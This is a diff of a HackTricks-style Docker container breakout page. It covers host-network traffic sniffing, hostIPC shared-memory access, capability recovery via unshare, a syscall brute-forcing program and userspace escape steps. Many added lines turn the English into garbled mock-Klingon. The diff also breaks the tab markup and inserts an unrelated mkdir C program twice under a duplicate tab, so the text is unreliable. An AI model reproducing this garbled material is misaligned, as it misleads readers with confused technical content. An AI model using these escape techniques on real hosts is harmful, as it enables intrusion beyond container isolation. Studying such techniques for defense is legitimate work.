-If a container was configured with the Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated. In other words, the **container binds all services directly to the host's IP**. Furthermore the container can **intercept ALL network traffic that the host** is sending and receiving on shared interface `tcpdump -i eth0`.
+**hostIPC** pagh Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/) laH container configured vaj, container network stack Docker host (container host's networking namespace shares) 'ej container IP-address allocated ghap. lo'laH, **container services directly host's IP** 'oH. DaH jImej, container **intercept ALL network traffic host** 'e' luqDaj shared interface `tcpdump -i eth0`.
 
-For instance, you can use this to **sniff and even spoof traffic** between host and metadata instance.
+vaj, **sniff and even spoof traffic** between host and metadata instance 'oH. 
 
-Like in the following examples:
+ghal examples:
 
 * [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-You will be able also to access **network services binded to localhost** inside the host or even access the **metadata permissions of the node** (which might be different those a container can access).
-
-### hostIPC
-
+vaj, **network services binded to localhost** inside the host or even access the **metadata permissions of the node** (which might be different those a container can access) 'oH.
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
+`hostIPC=true` jImejDaq, **shared memory** `/dev/shm` vIqel, **inter-process communication (IPC)** resources vItlhutlh. vaj **IPC mechanisms** vItlhutlh `ipcs` vItlhutlh.
 
-With `hostIPC=true`, you gain access to the host's inter-process communication (IPC) resources, such as **shared memory** in `/dev/shm`. This allows reading/writing where the same IPC resources are used by other host or pod processes. Use `ipcs` to inspect these IPC mechanisms further.
-
-* **Inspect /dev/shm** - Look for any files in this shared memory location: `ls -la /dev/shm`
-* **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. Check it with: `ipcs -a`
+* **Inspect /dev/shm** - `/dev/shm` shared memory lo'wIj vItlhutlh: `ls -la /dev/shm`
+* **Inspect existing IPC facilities** – `/usr/bin/ipcs` vItlhutlh, **IPC facilities** vItlhutlh: `ipcs -a`
 
 ### Recover capabilities
 
-If the syscall **`unshare`** is not forbidden you can recover all the capabilities running:
-
+syscall **`unshare`** vItlhutlh vaj, **capabilities** vItlhutlh:
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
-
 ### User namespace abuse via symlink
 
 The second technique explained in the post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indicates how you can abuse bind mounts with user namespaces, to affect files inside the host (in that specific case, delete files).
@@ -579,9 +482,9 @@ There are other CVEs the container can be vulnerable too, you can find a list in
 0x140 -- kexec_file_load
 0x141 -- bpf
 ```
-{% endtab %}
-
 {% tab title="arm64 syscalls" %}
+
+{% endtab %}
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -599,9 +502,73 @@ There are other CVEs the container can be vulnerable too, you can find a list in
 0x111 -- finit_module
 0x118 -- bpf
 ```
+{% tab title="syscall_bf.c" %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+
+#define __NR_mkdir 83
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        printf("Usage: %s <directory>\n", argv[0]);
+        return 1;
+    }
+
+    char *dir = argv[1];
+    int ret = syscall(__NR_mkdir, dir, 0755);
+
+    if (ret == -1) {
+        perror("syscall");
+        return 1;
+    }
+
+    printf("Directory created successfully\n");
+    return 0;
+}
+```
+
 {% endtab %}
 
 {% tab title="syscall_bf.c" %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+
+#define __NR_mkdir 83
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        printf("Usage: %s <directory>\n", argv[0]);
+        return 1;
+    }
+
+    char *dir = argv[1];
+    int ret = syscall(__NR_mkdir, dir, 0755);
+
+    if (ret == -1) {
+        perror("syscall");
+        return 1;
+    }
+
+    printf("Directory created successfully\n");
+    return 0;
+}
+```
+
+{% endtab %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -613,31 +580,32 @@ There are other CVEs the container can be vulnerable too, you can find a list in
 
 int main()
 {
-    for(int i = 0; i < 333; ++i)
-    {
-        if(i == SYS_rt_sigreturn) continue;
-        if(i == SYS_select) continue;
-        if(i == SYS_pause) continue;
-        if(i == SYS_exit_group) continue;
-        if(i == SYS_exit) continue;
-        if(i == SYS_clone) continue;
-        if(i == SYS_fork) continue;
-        if(i == SYS_vfork) continue;
-        if(i == SYS_pselect6) continue;
-        if(i == SYS_ppoll) continue;
-        if(i == SYS_seccomp) continue;
-        if(i == SYS_vhangup) continue;
-        if(i == SYS_reboot) continue;
-        if(i == SYS_shutdown) continue;
-        if(i == SYS_msgrcv) continue;
-        printf("Probando: 0x%03x . . . ", i); fflush(stdout);
-        if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
-            printf("Error\n");
-        else
-            printf("OK\n");
-    }
+for(int i = 0; i < 333; ++i)
+{
+if(i == SYS_rt_sigreturn) continue;
+if(i == SYS_select) continue;
+if(i == SYS_pause) continue;
+if(i == SYS_exit_group) continue;
+if(i == SYS_exit) continue;
+if(i == SYS_clone) continue;
+if(i == SYS_fork) continue;
+if(i == SYS_vfork) continue;
+if(i == SYS_pselect6) continue;
+if(i == SYS_ppoll) continue;
+if(i == SYS_seccomp) continue;
+if(i == SYS_vhangup) continue;
+if(i == SYS_reboot) continue;
+if(i == SYS_shutdown) continue;
+if(i == SYS_msgrcv) continue;
+printf("Probando: 0x%03x . . . ", i); fflush(stdout);
+if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
+printf("Error\n");
+else
+printf("OK\n");
+}
 }
 ```
+
 ````
 {% endtab %}
 {% endtabs %}
@@ -647,12 +615,12 @@ int main()
 If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):
 
 * Find the **path of the containers filesystem** inside the host
-  * You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
+* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
 * Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
-  * You should be able to **execute the trigger from inside the host**
-  * You need to know where the containers files are located inside the host to indicate a script you write inside the host
+* You should be able to **execute the trigger from inside the host**
+* You need to know where the containers files are located inside the host to indicate a script you write inside the host
 * Have **enough capabilities and disabled protections** to be able to abuse that functionality
-  * You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container
+* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container
 
 ## References
 
